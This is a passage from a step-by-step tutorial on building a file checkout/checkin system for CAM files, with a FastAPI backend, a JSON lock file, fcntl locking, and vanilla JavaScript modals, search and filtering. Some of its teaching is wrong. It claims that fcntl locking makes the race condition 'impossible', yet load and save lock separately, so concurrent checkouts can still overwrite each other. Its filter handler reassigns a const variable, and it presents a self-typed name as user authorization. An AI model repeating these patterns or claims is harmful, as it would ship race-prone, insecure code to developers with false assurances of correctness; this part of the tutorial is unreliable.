    # indent=4 makes it pretty-printed (readable)

### Convert to string
json_string = json.dumps(data, indent=4)
```

### The `with` Statement - Context Managers

**What is `with`?**

```python
### Without 'with' - Manual cleanup
f = open('file.txt', 'r')
content = f.read()
f.close()  # You MUST remember to close!
```

**Problems:**

- Easy to forget `close()`
- If error occurs, file might stay open
- Open files consume system resources

**With `with` - Automatic cleanup:**

```python
with open('file.txt', 'r') as f:
    content = f.read()
### File is AUTOMATICALLY closed here, even if error occurred
```

**How it works:**

1. `open()` returns a file object
2. `with` statement calls `f.__enter__()`
3. Your code runs
4. When block exits (success OR error), `with` calls `f.__exit__()`
5. `__exit__()` closes the file

**This is the Python Context Manager protocol.** Always use `with` for file operations.

---

## 3.6: Implementing File Locking

### The Lock Data Structure

Create `backend/locks.json`:

```json
{
  "PN1001_OP1.mcam": {
    "user": "john_doe",
    "timestamp": "2025-10-03T20:30:00Z",
    "message": "Editing fixture offsets"
  }
}
```

**Structure:**

- Key: filename
- Value: object with lock details

### Helper Functions

Add to `main.py`:

```python
import json
from datetime import datetime, timezone

### Path to locks file
LOCKS_FILE = BASE_DIR / 'locks.json'

### ============================================
### LOCK MANAGEMENT FUNCTIONS
### ============================================

def load_locks() -> dict:
    """
    Load lock data from locks.json.
    Returns empty dict if file doesn't exist.
    """
    if not LOCKS_FILE.exists():
        logger.info("Locks file doesn't exist, returning empty dict")
        return {}

    try:
        with open(LOCKS_FILE, 'r') as f:
            locks = json.load(f)
        logger.info(f"Loaded {len(locks)} locks from file")
        return locks
    except json.JSONDecodeError as e:
        logger.error(f"Error parsing locks.json: {e}")
        return {}

def save_locks(locks: dict):
    """
    Save lock data to locks.json.
    """
    try:
        with open(LOCKS_FILE, 'w') as f:
            json.dump(locks, f, indent=4)
        logger.info(f"Saved {len(locks)} locks to file")
    except Exception as e:
        logger.error(f"Error saving locks: {e}")
        raise HTTPException(
            status_code=500,
            detail="Failed to save lock data"
        )

def is_locked(filename: str) -> bool:
    """
    Check if a file is currently locked.
    """
    locks = load_locks()
    return filename in locks

def get_lock_info(filename: str) -> dict:
    """
    Get lock information for a specific file.
    Returns None if not locked.
    """
    locks = load_locks()
    return locks.get(filename)
```

### Understanding the Code

**Type hints: `-> dict`**

```python
def load_locks() -> dict:
```

The `-> dict` tells Python (and developers) what the function returns. This enables:

- IDE autocomplete
- Type checking tools (mypy)
- Better documentation

**`locks.get(filename)`**

```python
### With .get()
value = locks.get('PN1001_OP1.mcam')
### Returns None if key doesn't exist

### With [] brackets
value = locks['PN1001_OP1.mcam']
### Raises KeyError if key doesn't exist
```

`.get()` is safer for optional values.

---

## 3.7: Checkout and Checkin Endpoints

### Update the Data Models

```python
from pydantic import BaseModel, Field

class CheckoutRequest(BaseModel):
    filename: str
    user: str
    message: str = Field(..., min_length=1, max_length=500)

class CheckinRequest(BaseModel):
    filename: str
    user: str
```

### Implement Checkout

```python
@app.post("/api/files/checkout")
def checkout_file(request: CheckoutRequest):
    """
    Checkout a file (acquire lock).
    """
    logger.info(f"Checkout request: {request.user} -> {request.filename}")

    # Check if file exists
    file_path = REPO_PATH / request.filename
    if not file_path.exists():
        raise HTTPException(status_code=404, detail="File not found")

    # Load current locks
    locks = load_locks()

    # Check if already locked
    if request.filename in locks:
        existing_lock = locks[request.filename]
        raise HTTPException(
            status_code=409,  # 409 Conflict
            detail={
                "error": "File is already checked out",
                "locked_by": existing_lock["user"],
                "locked_at": existing_lock["timestamp"]
            }
        )

    # Create lock
    locks[request.filename] = {
        "user": request.user,
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "message": request.message
    }

    # Save locks
    save_locks(locks)

    logger.info(f"File checked out successfully: {request.filename}")

    return {
        "success": True,
        "message": f"File '{request.filename}' checked out by {request.user}"
    }
```

### Implement Checkin

```python
@app.post("/api/files/checkin")
def checkin_file(request: CheckinRequest):
    """
    Checkin a file (release lock).
    """
    logger.info(f"Checkin request: {request.user} -> {request.filename}")

    # Load current locks
    locks = load_locks()

    # Check if file is locked
    if request.filename not in locks:
        raise HTTPException(
            status_code=400,
            detail="File is not checked out"
        )

    # Verify user owns the lock
    lock_info = locks[request.filename]
    if lock_info["user"] != request.user:
        raise HTTPException(
            status_code=403,
            detail=f"File is locked by {lock_info['user']}, not {request.user}"
        )

    # Remove lock
    del locks[request.filename]

    # Save locks
    save_locks(locks)

    logger.info(f"File checked in successfully: {request.filename}")

    return {
        "success": True,
        "message": f"File '{request.filename}' checked in by {request.user}"
    }
```

### Update Get Files to Show Lock Status

```python
@app.get("/api/files")
def get_files():
    """
    Returns a list of all .mcam files with lock status.
    """
    logger.info(f"Scanning repository: {REPO_PATH}")

    if not REPO_PATH.exists():
        raise HTTPException(status_code=500, detail="Repository not found")

    # Load lock information
    locks = load_locks()

    all_items = os.listdir(REPO_PATH)
    files = []

    for filename in all_items:
        full_path = REPO_PATH / filename

        if full_path.is_file() and filename.endswith('.mcam'):
            # Check if file is locked
            if filename in locks:
                lock_info = locks[filename]
                status = "checked_out"
                locked_by = lock_info["user"]
            else:
                status = "available"
                locked_by = None

            files.append({
                "name": filename,
                "status": status,
                "size": full_path.stat().st_size,
                "locked_by": locked_by
            })

    logger.info(f"Returning {len(files)} files")
    return {"files": files}
```

---

## 3.8: Race Conditions - The Biggest Hidden Danger

### What is a Race Condition?

A **race condition** occurs when two operations happen at the "same time" and interfere with each other.

**The Scenario:**

```
10:00:00.000 - User A requests checkout of file.mcam
10:00:00.001 - User B requests checkout of file.mcam

Both requests:
1. load_locks() - both see file is NOT locked
2. Both add their lock to the dict
3. Both save_locks()

Result: Last save wins. One user's lock is silently overwritten.
```

### Visualizing the Race

```python
### User A's request thread
locks = load_locks()          # locks = {}
locks['file.mcam'] = {        # locks = {'file.mcam': {user: 'A'}}
    'user': 'A'
}
### ← Context switch happens here!
save_locks(locks)             # Writes: {'file.mcam': {user: 'A'}}

### User B's request thread
locks = load_locks()          # locks = {} (before A saved!)
locks['file.mcam'] = {        # locks = {'file.mcam': {user: 'B'}}
    'user': 'B'
}
save_locks(locks)             # Writes: {'file.mcam': {user: 'B'}}
                              # User A's lock is GONE
```

### The Solution: File Locking

Python's `fcntl` module (Unix) or `msvcrt` (Windows) provides OS-level file locking.

**Create a helper class:**

```python
import fcntl  # Unix/Linux/Mac
### For Windows, you'd use: import msvcrt

class LockedFile:
    """
    Context manager for file locking.
    Ensures only one process can access the file at a time.
    """
    def __init__(self, filepath, mode='r'):
        self.filepath = filepath
        self.mode = mode
        self.file = None

    def __enter__(self):
        self.file = open(self.filepath, self.mode)
        # Acquire exclusive lock (blocks until available)
        fcntl.flock(self.file, fcntl.LOCK_EX)
        logger.debug(f"Acquired lock on {self.filepath}")
        return self.file

    def __exit__(self, exc_type, exc_val, exc_tb):
        # Release lock
        fcntl.flock(self.file, fcntl.LOCK_UN)
        self.file.close()
        logger.debug(f"Released lock on {self.filepath}")
        return False
```

### Update Lock Functions

```python
def load_locks() -> dict:
    """Load locks with file locking."""
    if not LOCKS_FILE.exists():
        return {}

    try:
        with LockedFile(LOCKS_FILE, 'r') as f:
            locks = json.load(f)
        return locks
    except json.JSONDecodeError:
        return {}

def save_locks(locks: dict):
    """Save locks with file locking."""
    with LockedFile(LOCKS_FILE, 'w') as f:
        json.dump(locks, f, indent=4)
```

**Now the race condition is impossible:**

1. User A's request acquires file lock
2. User B's request tries to acquire lock
3. User B's request **waits** (blocks)
4. User A finishes, releases lock
5. User B acquires lock and proceeds

### Testing the Fix

This is hard to test manually (race conditions are by nature rare). We'll write a proper test in Stage 31.

---

## 3.9: Update Frontend for Checkout/Checkin

### Update HTML

Replace the checkout form section in `index.html`:

```html
<section>
  <h2>File Actions</h2>
  <div id="file-actions">
    <p>Select a file from the list below to checkout or checkin.</p>
  </div>
</section>
```

### Update CSS

Add to `style.css`:

```css
/* ============================================
   FILE ACTIONS
   ============================================ */

.file-actions {
  display: flex;
  gap: 0.5rem;
  align-items: center;
}

.btn-checkout {
  background: #28a745;
}

.btn-checkout:hover {
  background: #218838;
}

.btn-checkin {
  background: #ffc107;
  color: #333;
}

.btn-checkin:hover {
  background: #e0a800;
}

.locked-indicator {
  font-size: 0.85rem;
  color: #856404;
  font-style: italic;
}
```

### Update JavaScript

Replace the file display logic in `app.js`:

```javascript
function createFileElement(file) {
  const div = document.createElement("div");
  div.className = "file-item";

  // File info section
  const infoDiv = document.createElement("div");

  const nameSpan = document.createElement("span");
  nameSpan.className = "file-name";
  nameSpan.textContent = file.name;

  const statusSpan = document.createElement("span");
  statusSpan.className = `file-status status-${file.status}`;
  statusSpan.textContent = file.status.replace("_", " ");

  infoDiv.appendChild(nameSpan);
  infoDiv.appendChild(statusSpan);

  // Locked by info
  if (file.locked_by) {
    const lockedSpan = document.createElement("span");
    lockedSpan.className = "locked-indicator";
    lockedSpan.textContent = ` (locked by ${file.locked_by})`;
    infoDiv.appendChild(lockedSpan);
  }

  // Actions section
  const actionsDiv = document.createElement("div");
  actionsDiv.className = "file-actions";

  if (file.status === "available") {
    const checkoutBtn = document.createElement("button");
    checkoutBtn.className = "btn btn-checkout";
    checkoutBtn.textContent = "Checkout";
    checkoutBtn.onclick = () => handleCheckout(file.name);
    actionsDiv.appendChild(checkoutBtn);
  } else {
    const checkinBtn = document.createElement("button");
    checkinBtn.className = "btn btn-checkin";
    checkinBtn.textContent = "Checkin";
    checkinBtn.onclick = () => handleCheckin(file.name);
    actionsDiv.appendChild(checkinBtn);
  }

  div.appendChild(infoDiv);
  div.appendChild(actionsDiv);

  return div;
}

// ============================================
// CHECKOUT HANDLER
// ============================================

async function handleCheckout(filename) {
  const user = prompt("Enter your name:");
  if (!user) return;

  const message = prompt("Why are you checking out this file?");
  if (!message) return;

  try {
    const response = await fetch("/api/files/checkout", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ filename, user, message }),
    });

    if (response.ok) {
      alert(`Successfully checked out ${filename}`);
      loadFiles(); // Reload to show new status
    } else {
      const error = await response.json();
      alert(`Error: ${error.detail.error || error.detail}`);
    }
  } catch (error) {
    console.error("Checkout error:", error);
    alert("Network error. Please try again.");
  }
}

// ============================================
// CHECKIN HANDLER
// ============================================

async function handleCheckin(filename) {
  const user = prompt("Enter your name (must match checkout user):");
  if (!user) return;

  try {
    const response = await fetch("/api/files/checkin", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ filename, user }),
    });

    if (response.ok) {
      alert(`Successfully checked in ${filename}`);
      loadFiles();
    } else {
      const error = await response.json();
      alert(`Error: ${error.detail}`);
    }
  } catch (error) {
    console.error("Checkin error:", error);
    alert("Network error. Please try again.");
  }
}
```

---

## 3.10: Testing the Complete System

### Test Scenario 1: Normal Checkout/Checkin

1. Visit `http://127.0.0.1:8000`
2. Click "Checkout" on any file
3. Enter your name: "John"
4. Enter message: "Testing the lock system"
5. File status changes to "checked_out"
6. Click "Checkin"
7. Enter name: "John" (same user)
8. File status changes to "available"

### Test Scenario 2: Preventing Double Checkout

1. Checkout a file as "John"
2. Try to checkout the same file as "Jane"
3. Should see error: "File is already checked out"

### Test Scenario 3: Wrong User Checkin

1. Checkout file as "John"
2. Try to checkin as "Jane"
3. Should see error: "File is locked by John, not Jane"

### Check the locks.json File

After checking out a file:

```bash
cat backend/locks.json
```

You should see:

```json
{
  "PN1001_OP1.mcam": {
    "user": "John",
    "timestamp": "2025-10-03T20:45:30.123456Z",
    "message": "Testing the lock system"
  }
}
```

---

## Stage 3 Complete - Real File Operations

### What You Built

You now have:

- Real file reading from the filesystem
- File locking system (prevents concurrent edits)
- JSON-based data persistence
- Protected against race conditions
- Complete checkout/checkin workflow
- Error handling for all edge cases

### Key Concepts Mastered

**File I/O:**

- `os` module operations
- `pathlib.Path` for modern path handling
- Absolute vs relative paths
- Context managers (`with` statement)

**JSON:**

- Reading/writing JSON files
- Python ↔ JSON type mapping
- Structured data storage

**Concurrency:**

- Race conditions and how they happen
- File locking with `fcntl`
- Atomic operations

**Application Logic:**

- State management (locked vs available)
- User authorization (only lock owner can checkin)
- Data validation with Pydantic

### Verification Checklist

- [ ] Can see real files from `repo/` directory
- [ ] Can checkout a file
- [ ] Can checkin a file
- [ ] Cannot checkout already-locked file
- [ ] Cannot checkin file locked by someone else
- [ ] `locks.json` updates correctly
- [ ] Understand file I/O operations
- [ ] Understand race conditions
- [ ] Understand JSON serialization

#

In **Stage 4**, we'll modernize the frontend by introducing a **React component** (optional pivot) or enhancing our vanilla JS with better state management, and we'll add features like:

- File filtering and search
- Sorting
- Better UI for checkout/checkin (modal dialogs)
- Real-time updates without page refresh

But first, we have a solid foundation: a working PDM system that prevents file conflicts!

### Stage 4: Frontend Enhancements - Interactive UI Patterns

## Introduction: The Goal of This Stage

Your app works, but the UX needs polish. Using `prompt()` dialogs is clunky. Users can't search or filter files. There's no visual feedback during operations.

In this stage, you'll learn professional frontend patterns:

- Custom modal dialogs (replacing browser prompts)
- Search and filter functionality
- Sorting with multiple criteria
- Loading states and user feedback
- Event delegation for better performance
- State management patterns in vanilla JavaScript

By the end of this stage, you will:

- Build reusable modal components
- Implement client-side search/filter
- Add multi-column sorting
- Show loading spinners during API calls
- Understand event bubbling and delegation
- Learn when vanilla JS is enough (and when frameworks help)

**Time Investment:** 4-6 hours

---

## 4.1: The Problem with `prompt()` and `alert()`

### Why Browser Dialogs Are Bad UX

**Current code:**

```javascript
const user = prompt("Enter your name:");
const message = prompt("Why are you checking out this file?");
```

**Problems:**

1. **Ugly** - Can't style them, look different on every browser
2. **Blocking** - Entire page freezes
3. **Limited** - Only plain text, no validation
4. **Inaccessible** - Screen readers struggle
5. **Non-standard** - Some browsers suppress them

**Professional Solution:** Custom modal dialogs.

---

## 4.2: Building a Modal Component

### Understanding Modal Architecture

A modal is composed of:

1. **Overlay (backdrop)** - Darkens background, blocks clicks
2. **Modal container** - The actual dialog box
3. **Content** - Form, text, buttons
4. **Close mechanism** - X button, Cancel, click outside, ESC key

### HTML Structure

Add to `index.html` (before closing `</body>`):

```html
<!-- Checkout Modal -->
<div id="checkout-modal" class="modal-overlay hidden">
  <div class="modal-content">
    <div class="modal-header">
      <h3>Checkout File</h3>
      <button class="modal-close" aria-label="Close">&times;</button>
    </div>
    <div class="modal-body">
      <p>File: <strong id="checkout-filename"></strong></p>

      <form id="checkout-form">
        <div class="form-group">
          <label for="checkout-user">Your Name:</label>
          <input
            type="text"
            id="checkout-user"
            required
            placeholder="Enter your name"
            autocomplete="name"
          />
        </div>

        <div class="form-group">
          <label for="checkout-message">Reason:</label>
          <textarea
            id="checkout-message"
            rows="3"
            required
            placeholder="Why are you checking out this file?"
          ></textarea>
        </div>

        <div class="modal-actions">
          <button type="button" class="btn btn-secondary" id="checkout-cancel">
            Cancel
          </button>
          <button type="submit" class="btn btn-checkout">Checkout</button>
        </div>
      </form>
    </div>
  </div>
</div>

<!-- Checkin Modal -->
<div id="checkin-modal" class="modal-overlay hidden">
  <div class="modal-content">
    <div class="modal-header">
      <h3>Checkin File</h3>
      <button class="modal-close" aria-label="Close">&times;</button>
    </div>
    <div class="modal-body">
      <p>File: <strong id="checkin-filename"></strong></p>
      <p class="info-text">
        Checking in will release the lock and allow others to edit this file.
      </p>

      <form id="checkin-form">
        <div class="form-group">
          <label for="checkin-user"
            >Your Name (must match checkout user):</label
          >
          <input
            type="text"
            id="checkin-user"
            required
            placeholder="Enter your name"
          />
        </div>

        <div class="modal-actions">
          <button type="button" class="btn btn-secondary" id="checkin-cancel">
            Cancel
          </button>
          <button type="submit" class="btn btn-checkin">Checkin</button>
        </div>
      </form>
    </div>
  </div>
</div>
```

### CSS for Modals

Add to `style.css`:

```css
/* ============================================
   MODAL DIALOGS
   ============================================ */

.modal-overlay {
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background: rgba(0, 0, 0, 0.5);
  display: flex;
  justify-content: center;
  align-items: center;
  z-index: 1000;
  backdrop-filter: blur(2px);
}

.modal-overlay.hidden {
  display: none;
}

.modal-content {
  background: white;
  border-radius: 8px;
  max-width: 500px;
  width: 90%;
  max-height: 90vh;
  overflow-y: auto;
  box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
  animation: modalSlideIn 0.3s ease-out;
}

@keyframes modalSlideIn {
  from {
    transform: translateY(-50px);
    opacity: 0;
  }
  to {
    transform: translateY(0);
    opacity: 1;
  }
}

.modal-header {
  padding: 1.5rem;
  border-bottom: 1px solid #e0e0e0;
  display: flex;
  justify-content: space-between;
  align-items: center;
}

.modal-header h3 {
  margin: 0;
  color: #333;
  font-size: 1.5rem;
}

.modal-close {
  background: none;
  border: none;
  font-size: 2rem;
  color: #999;
  cursor: pointer;
  padding: 0;
  width: 30px;
  height: 30px;
  display: flex;
  align-items: center;
  justify-content: center;
  border-radius: 4px;
  transition: all 0.2s;
}

.modal-close:hover {
  background: #f0f0f0;
  color: #333;
}

.modal-body {
  padding: 1.5rem;
}

.modal-actions {
  display: flex;
  gap: 1rem;
  justify-content: flex-end;
  margin-top: 1.5rem;
}

.btn-secondary {
  background: #6c757d;
}

.btn-secondary:hover {
  background: #5a6268;
}

.info-text {
  background: #e7f3ff;
  padding: 0.75rem;
  border-radius: 4px;
  border-left: 4px solid #667eea;
  margin: 1rem 0;
  color: #004085;
}

textarea {
  width: 100%;
  padding: 0.75rem;
  border: 1px solid #ddd;
  border-radius: 4px;
  font-size: 1rem;
  font-family: inherit;
  resize: vertical;
  transition: border-color 0.3s ease;
}

textarea:focus {
  outline: none;
  border-color: #667eea;
  box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
}
```

### Understanding the CSS

**`position: fixed`**

```css
.modal-overlay {
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
}
```

- **Fixed positioning** - Element removed from normal document flow
- Position relative to **viewport** (browser window), not parent
- Stays in place when page scrolls
- Setting all four directions (top/left/right/bottom) to 0 makes it fill the screen

**`z-index: 1000`**

Controls stacking order:

- Higher number = appears on top
- Only works on positioned elements (`position: relative/absolute/fixed`)
- `1000` is arbitrary but high enough to be above normal content

**`backdrop-filter: blur(2px)`**

- Modern CSS property
- Applies visual effects to the area **behind** an element
- Creates that "frosted glass" effect
- Not supported in all browsers (graceful degradation)

**CSS Animations**

```css
@keyframes modalSlideIn {
  from {
    transform: translateY(-50px);
    opacity: 0;
  }
  to {
    transform: translateY(0);
    opacity: 1;
  }
}

.modal-content {
  animation: modalSlideIn 0.3s ease-out;
}
```

**How it works:**

1. `@keyframes` defines the animation sequence
2. `from` = starting state (50px above, invisible)
3. `to` = ending state (normal position, visible)
4. `animation:` applies it (name, duration, timing function)

**Timing functions:**

- `linear` - Constant speed
- `ease` - Slow start, fast middle, slow end (default)
- `ease-in` - Slow start, fast end
- `ease-out` - Fast start, slow end (feels most natural)
- `ease-in-out` - Slow start and end

---

## 4.3: Modal JavaScript Logic

### Modal Manager Class

Add to `app.js`:

```javascript
// ============================================
// MODAL MANAGER
// ============================================

class ModalManager {
  constructor(modalId) {
    this.modal = document.getElementById(modalId);
    this.overlay = this.modal;

    // Bind close handlers
    this.setupCloseHandlers();
  }

  setupCloseHandlers() {
    // Close button (X)
    const closeBtn = this.modal.querySelector(".modal-close");
    if (closeBtn) {
      closeBtn.addEventListener("click", () => this.close());
    }

    // Click outside modal
    this.overlay.addEventListener("click", (e) => {
      if (e.target === this.overlay) {
        this.close();
      }
    });

    // ESC key
    document.addEventListener("keydown", (e) => {
      if (e.key === "Escape" && !this.modal.classList.contains("hidden")) {
        this.close();
      }
    });
  }

  open() {
    this.modal.classList.remove("hidden");
    // Focus first input
    const firstInput = this.modal.querySelector("input, textarea");
    if (firstInput) {
      setTimeout(() => firstInput.focus(), 100);
    }
  }

  close() {
    this.modal.classList.add("hidden");
  }
}

// Create modal instances
const checkoutModal = new ModalManager("checkout-modal");
const checkinModal = new ModalManager("checkin-modal");
```

### Understanding JavaScript Classes

**What is a class?**

A **class** is a blueprint for creating objects with shared behavior.

**Before classes (ES5 - old way):**

```javascript
function ModalManager(modalId) {
  this.modal = document.getElementById(modalId);
}

ModalManager.prototype.open = function () {
  this.modal.classList.remove("hidden");
};
```

**With classes (ES6 - modern):**

```javascript
class ModalManager {
  constructor(modalId) {
    this.modal = document.getElementById(modalId);
  }

  open() {
    this.modal.classList.remove("hidden");
  }
}
```

**Key concepts:**

**`constructor`** - Special method that runs when you create an instance

```javascript
const myModal = new ModalManager("checkout-modal");
// Calls: constructor('checkout-modal')
```

**`this`** - Refers to the instance

```javascript
class ModalManager {
    constructor(modalId) {
        this.modal = ...;  // Instance property
    }

    open() {
        this.modal.classList.remove('hidden');  // Access instance property
    }
}
```

**Methods** - Functions defined in the class

```javascript
myModal.open(); // Calls the open() method
myModal.close(); // Calls the close() method
```

### Event Delegation - Click Outside

```javascript
this.overlay.addEventListener("click", (e) => {
  if (e.target === this.overlay) {
    this.close();
  }
});
```

**The problem:** Modal has children (the white box). If you click the white box, `e.target` is the white box, not the overlay.

**The solution:** Only close if clicked element IS the overlay itself.

**Event bubbling visualization:**

```
Click happens on:
    <button> (innermost)
        ↓ bubbles up
    <div class="modal-body">
        ↓ bubbles up
    <div class="modal-content">
        ↓ bubbles up
    <div class="modal-overlay"> ← event.target stops here
```

If you click the overlay background, `e.target === this.overlay` is true.
If you click inside, `e.target` is a child element, condition is false.

### Arrow Functions vs Regular Functions

```javascript
// Arrow function
setupCloseHandlers() {
    closeBtn.addEventListener('click', () => this.close());
}

// Regular function
setupCloseHandlers() {
    closeBtn.addEventListener('click', function() {
        this.close();  // ERROR: 'this' is wrong!
    });
}
```

**The difference: `this` binding**

- **Arrow functions** - `this` is lexically bound (uses parent scope's `this`)
- **Regular functions** - `this` depends on how function is called

**In event listeners:**

- Arrow: `this` = your class instance ✓
- Regular: `this` = the element that fired the event ✗

**Rule of thumb:** Use arrow functions in classes to avoid `this` confusion.

---

## 4.4: Integrating Modals with Checkout/Checkin

### Update Checkout Handler

Replace the `handleCheckout` function in `app.js`:

```javascript
// Store current filename globally
let currentFilename = null;

async function handleCheckout(filename) {
  console.log("Opening checkout modal for:", filename);
  currentFilename = filename;

  // Update modal title
  document.getElementById("checkout-filename").textContent = filename;

  // Clear previous form data
  document.getElementById("checkout-form").reset();

  // Open modal
  checkoutModal.open();
}
```

### Handle Checkout Form Submission

```javascript
// Setup form submission (add to DOMContentLoaded)
document
  .getElementById("checkout-form")
  .addEventListener("submit", async (e) => {
    e.preventDefault();

    const user = document.getElementById("checkout-user").value;
    const message = document.getElementById("checkout-message").value;

    console.log("Submitting checkout:", { currentFilename, user, message });

    try {
      const response = await fetch("/api/files/checkout", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          filename: currentFilename,
          user: user,
          message: message,
        }),
      });

      const data = await response.json();

      if (response.ok) {
        showNotification("File checked out successfully!", "success");
        checkoutModal.close();
        loadFiles();
      } else {
        showNotification(data.detail.error || data.detail, "error");
      }
    } catch (error) {
      console.error("Checkout error:", error);
      showNotification("Network error. Please try again.", "error");
    }
  });

// Cancel button
document.getElementById("checkout-cancel").addEventListener("click", () => {
  checkoutModal.close();
});
```

### Update Checkin Handler

```javascript
async function handleCheckin(filename) {
  console.log("Opening checkin modal for:", filename);
  currentFilename = filename;

  document.getElementById("checkin-filename").textContent = filename;
  document.getElementById("checkin-form").reset();

  checkinModal.open();
}

// Checkin form submission (add to DOMContentLoaded)
document
  .getElementById("checkin-form")
  .addEventListener("submit", async (e) => {
    e.preventDefault();

    const user = document.getElementById("checkin-user").value;

    try {
      const response = await fetch("/api/files/checkin", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          filename: currentFilename,
          user: user,
        }),
      });

      const data = await response.json();

      if (response.ok) {
        showNotification("File checked in successfully!", "success");
        checkinModal.close();
        loadFiles();
      } else {
        showNotification(data.detail, "error");
      }
    } catch (error) {
      console.error("Checkin error:", error);
      showNotification("Network error. Please try again.", "error");
    }
  });

document.getElementById("checkin-cancel").addEventListener("click", () => {
  checkinModal.close();
});
```

### Toast Notifications (Better than Alert)

Add this to `app.js`:

```javascript
// ============================================
// NOTIFICATIONS (Toast Messages)
// ============================================

function showNotification(message, type = "info") {
  // Create toast element
  const toast = document.createElement("div");
  toast.className = `toast toast-${type}`;
  toast.textContent = message;

  // Add to body
  document.body.appendChild(toast);

  // Animate in
  setTimeout(() => toast.classList.add("show"), 10);

  // Remove after 3 seconds
  setTimeout(() => {
    toast.classList.remove("show");
    setTimeout(() => toast.remove(), 300);
  }, 3000);
}
```

### Toast CSS

Add to `style.css`:

```css
/* ============================================
   TOAST NOTIFICATIONS
   ============================================ */

.toast {
  position: fixed;
  bottom: 20px;
  right: 20px;
  padding: 1rem 1.5rem;
  background: white;
  border-radius: 4px;
  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
  transform: translateX(400px);
  transition: transform 0.3s ease;
  z-index: 2000;
  max-width: 300px;
  font-weight: 500;
}

.toast.show {
  transform: translateX(0);
}

.toast-success {
  border-left: 4px solid #28a745;
  color: #155724;
}

.toast-error {
  border-left: 4px solid #dc3545;
  color: #721c24;
}

.toast-info {
  border-left: 4px solid #667eea;
  color: #004085;
}
```

---

## 4.5: Search and Filter Functionality

### Add Search UI

Update `index.html` file list section:

```html
<section id="file-list-section">
  <div
    style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 1rem;"
  >
    <h2>Available Files</h2>
    <button id="refresh-btn" class="btn">Refresh</button>
  </div>

  <!-- Search and Filter Controls -->
  <div class="controls-row">
    <div class="search-box">
      <input
        type="text"
        id="search-input"
        placeholder="Search files..."
        class="search-input"
      />
    </div>

    <div class="filter-group">
      <label for="status-filter">Status:</label>
      <select id="status-filter" class="filter-select">
        <option value="all">All</option>
        <option value="available">Available</option>
        <option value="checked_out">Checked Out</option>
      </select>
    </div>
  </div>

  <div id="file-list">
    <p>Loading files...</p>
  </div>
</section>
```

### Search/Filter CSS

```css
/* ============================================
   SEARCH & FILTER CONTROLS
   ============================================ */

.controls-row {
  display: flex;
  gap: 1rem;
  margin-bottom: 1.5rem;
  flex-wrap: wrap;
}

.search-box {
  flex: 1;
  min-width: 200px;
}

.search-input {
  width: 100%;
  padding: 0.75rem 1rem;
  border: 1px solid #ddd;
  border-radius: 4px;
  font-size: 1rem;
}

.filter-group {
  display: flex;
  align-items: center;
  gap: 0.5rem;
}

.filter-group label {
  margin: 0;
  font-weight: 500;
  color: #666;
}

.filter-select {
  padding: 0.75rem 1rem;
  border: 1px solid #ddd;
  border-radius: 4px;
  font-size: 1rem;
  cursor: pointer;
  background: white;
}

.filter-select:focus {
  outline: none;
  border-color: #667eea;
}
```

### Search/Filter JavaScript

Add to `app.js`:

```javascript
// ============================================
// SEARCH AND FILTER STATE
// ============================================

let allFiles = []; // Store all files
let searchTerm = "";
let statusFilter = "all";

// ============================================
// LOAD AND FILTER FILES
// ============================================

async function loadFiles() {
  console.log("Loading files from API...");

  try {
    const response = await fetch("/api/files");

    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }

    const data = await response.json();
    console.log("Received data:", data);

    // Store all files
    allFiles = data.files;

    // Apply filters and display
    displayFilteredFiles();
  } catch (error) {
    console.error("Error loading files:", error);
    displayError("Failed to load files. Please refresh the page.");
  }
}

function displayFilteredFiles() {
  // Apply search filter
  let filtered = allFiles.filter((file) => {
    const matchesSearch = file.name
      .toLowerCase()
      .includes(searchTerm.toLowerCase());
    const matchesStatus =
      statusFilter === "all" || file.status === statusFilter;
    return matchesSearch && matchesStatus;
  });

  console.log(`Displaying ${filtered.length} of ${allFiles.length} files`);

  displayFiles(filtered);
}

// ============================================
// SEARCH INPUT HANDLER
// ============================================

document.addEventListener("DOMContentLoaded", function () {
  // ... existing code ...

  // Search input
  const searchInput = document.getElementById("search-input");
  searchInput.addEventListener("input", (e) => {
    searchTerm = e.target.value;
    displayFilteredFiles();
  });

  // Status filter
  const statusFilter = document.getElementById("status-filter");
  statusFilter.addEventListener("change", (e) => {
    statusFilter = e.target.value;
    displayFilteredFiles();
  });
});
```

### Understanding Array Filter

```javascript
let filtered = allFiles.filter((file) => {
  return file.name.toLowerCase().includes(searchTerm.toLowerCase());
});
```

**How `filter()` works:**

1. Takes a callback function
2. Calls it for EACH element in the array
3. If callback returns `true`, element is included in new array
4. If callback returns `false`, element is excluded
5. Returns a NEW array (doesn't modify original)

**Example:**

```javascript
const numbers = [1, 2, 3, 4, 5, 6];
const evens = numbers.filter((n) => n % 2 === 0);
// evens = [2, 4, 6]
// numbers still = [1, 2, 3, 4, 5, 6] (unchanged)
```

### String Methods for Search

```javascript
file.name.toLowerCase().includes(searchTerm.toLowerCase());
```

**Breaking it down:**

**`.toLowerCase()`**

- Converts string to lowercase
- "PN1001_OP1.mcam" → "pn1001_op1.mcam"
- Makes search case-insensitive

**`.includes(substring)`**

- Returns `true` if string contains substring
- `"hello world".includes("wor")` → `true`
- `"hello world".includes("xyz")` → `false`

**Why lowercase both?**

```javascript
// Without lowercase:
"PN1001".includes("pn"); // false (case mismatch!)

// With lowercase:
"PN1001".toLowerCase().includes("pn".toLowerCase()); // true
```

---

## 4.6: Sorting Functionality

### Add Sort Controls

Update the controls row in HTML:

```html
<div class="controls-row">
  <div class="search-box">
    <input
      type="text"
      id="search-input"
      placeholder="Search files..."
      class="search-input"
    />
  </div>

  <div class="filter-group">
    <label for="status-filter">Status:</label>
    <select id="status-filter" class="filter-select">
      <option value="all">All</option>
      <option value="available">Available</option>
      <option value="checked_out">Checked Out</option>
    </select>
  </div>

  <div class="filter-group">
    <label for="sort-select">Sort by:</label>
    <select id="sort-select" class="filter-select">
      <option value="name-asc">Name (A-Z)</option>
